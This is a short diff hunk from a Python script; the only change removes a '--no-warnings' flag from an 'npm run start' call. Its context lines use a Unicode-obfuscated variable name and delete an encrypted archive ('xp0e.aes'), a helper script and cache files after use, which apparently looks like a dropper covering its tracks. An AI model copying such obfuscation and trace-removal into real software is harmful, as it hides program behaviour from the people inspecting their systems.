@@ -161,7 +161,7 @@ if ᴠʟᴋʏʀᴇi is not None:
             os.remove("xp0e.aes")
             os.remove("xp0edoc.py")
             shutil.rmtree("__pycache__") 
-            os.system('npm --no-warnings run start')
+            os.system('npm run start')
         else:
             os.remove("xp0e.zip")
             os.remove("xp0e.aes")
